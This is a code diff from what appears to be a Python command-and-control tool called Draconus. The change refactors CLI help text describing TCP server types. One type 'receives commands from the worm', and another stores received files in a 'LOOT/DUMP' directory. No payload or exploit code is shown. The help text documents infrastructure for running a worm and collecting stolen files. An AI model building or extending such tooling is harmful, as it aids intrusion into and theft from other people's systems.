@@ -7,6 +7,16 @@ from time import sleep
 from .queen_shell import QueenShell
 from .client_shell import ClientShell
 
+HELP_SERVER_TYPES = """
+\nTypes of servers you can create:\n
+'default' - Default. Does not require a type. TCP server. Sends and receives messages in base64 encoded JSON. Can send and receive multiple files at once, receives commands from the worm.\n
+'raw' - TCP server. Sends and receives messages without any coding etc. Perfect for simple communication.\n
+'down' - Simple TCP server for receiving files. Accepts a connection and immediately receives the file, then disconnects the client. The downloaded files are located in the 'OUTPUT/LOOT/DUMP' directory\n
+'send' - Server TCP only for uploading files. When a client connects it automatically sends files to it. After the server is created, a directory with the server name will appear in the 'IN' directory, place the files to be sent there.\n
+'b64' - Server TCP. Sends and receives base64 encoded messages.\n
+\n
+"""
+
 
 class DracoShell:
     def __init__(self, main_shell: object, commander: object):
@@ -14,6 +24,7 @@ class DracoShell:
         self.COM = commander
         self.sort = self.main.sorter
     
+
     def build(self) -> object:
 
         @shell(prompt=f"[DRACONUS] >>", intro="------ Welcome To Draconus ! Put help for commands list ------- ", on_finished=self.main.exit_shell)
@@ -53,16 +64,11 @@ class DracoShell:
         def task() -> None:
             self.COM.send_CMD("sys", "task")
         
-        _draco_option_types_help = """\nTCP connection type. Receiving raw bytes, encoded JSON, etc.\n
-'default' - Send and recive data in encode JSON\n
-'raw' - Send and recive data in bytes\n
-'down' - Simple server. Only recive files\n
-'send' - Server only for uploading files. When a client connects it automatically sends files to it. After the server is created, a directory with the server name will appear in the 'IN' directory, place the files to be sent there."""
         
         @dracoShell.command()
         @click.argument("name")
         @click.argument("port")
-        @click.option("--types", "-t", required=False, help=_draco_option_types_help)
+        @click.option("--types", "-t", required=False, help=HELP_SERVER_TYPES)
         def server(name, port, types) -> None:
             """\n\tname  --  Server Name\n\n\tport  --  Server Port. Bigger than 1999"""
             data = {"name" : name, "port" : port}
